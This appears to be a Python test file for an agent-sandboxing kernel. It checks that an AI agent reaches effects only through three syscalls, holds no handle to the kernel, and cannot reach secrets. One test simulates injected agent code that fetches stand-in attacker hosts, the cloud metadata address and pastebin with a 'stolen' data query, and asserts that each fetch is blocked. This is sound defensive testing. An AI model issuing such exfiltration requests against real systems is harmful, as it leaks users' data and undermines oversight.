"""The invariant that makes this a kernel (INV-1): no path to an effect but the syscall.

These tests assert the property behaviourally, not merely structurally: the agent's API
surface is exactly the three syscalls, no agent-reachable *attribute* hands back the
kernel, and — the part that actually matters — even arbitrary agent-controlled code
routed through the code tool cannot reach an unapproved host or obtain a secret.

Honesty note: CPython has no true privacy, so the structural checks below are
defense-in-depth, not the boundary. The boundary is the sandbox (egress deny-by-default
+ broker injection); the behavioural tests are what exercise it.
"""

from mandate.demo import DEMO_SECRET_VALUE, build_bundle, build_tools
from mandate.kernel import SyscallGateway
from mandate.sdk import AgentClient


def agent_for():
    gw = SyscallGateway(
        build_bundle(), tools=build_tools(), vault={"vault://acme/ss-key": DEMO_SECRET_VALUE}
    )
    return gw, AgentClient(gw)


def test_agent_surface_is_exactly_the_three_syscalls():
    _, agent = agent_for()
    public = {n for n in dir(agent) if not n.startswith("_")}
    # subject is a read-only convenience view; the verbs are the three syscalls.
    assert public == {"tool_call", "memory_write", "approval_request", "subject"}


def test_agent_instance_holds_no_attribute_handle_to_the_kernel():
    gw, agent = agent_for()
    # The gateway is captured in closures, not stored as `self._gateway`, so there is no
    # `agent._gateway.broker._vault`-style attribute walk into the kernel...
    assert not hasattr(agent, "_gateway")
    # ...and no instance attribute *is* the gateway or one of its subsystems.
    subsystems = {id(x) for x in (gw, gw.broker, gw.egress, gw.budget, gw.memory, gw.audit)}
    for value in vars(agent).values():
        assert id(value) not in subsystems


def test_subject_view_does_not_leak_back_to_the_kernel():
    gw, agent = agent_for()
    # The one value the agent *can* read is the subject — a frozen value with no handle
    # back to the gateway or its subsystems.
    assert agent.subject is gw.subject
    assert not hasattr(agent.subject, "broker")


def test_injected_code_cannot_exfiltrate_even_with_a_guessed_url():
    _, agent = agent_for()
    # Simulated injection: agent code tries several exfil hosts. All are refused.
    for host in ["attacker.evil", "evil.example", "169.254.169.254", "pastebin.com"]:
        res = agent.tool_call(
            "fs.workspace.rw", "code_exec", {"fetch": [f"https://{host}/x?d=stolen"]}
        )
        assert res.status == "blocked", host


def test_injected_code_has_no_route_to_the_secret():
    _, agent = agent_for()
    # The code tool has no secret accessor; the best injection can do is try to fetch,
    # which is blocked, and it never has the key to begin with.
    res = agent.tool_call(
        "fs.workspace.rw", "code_exec", {"fetch": ["https://api.semanticscholar.org/leak"]}
    )
    # Even reaching an *allowed* host, no secret is available to the code tool.
    assert DEMO_SECRET_VALUE not in repr(res.result)
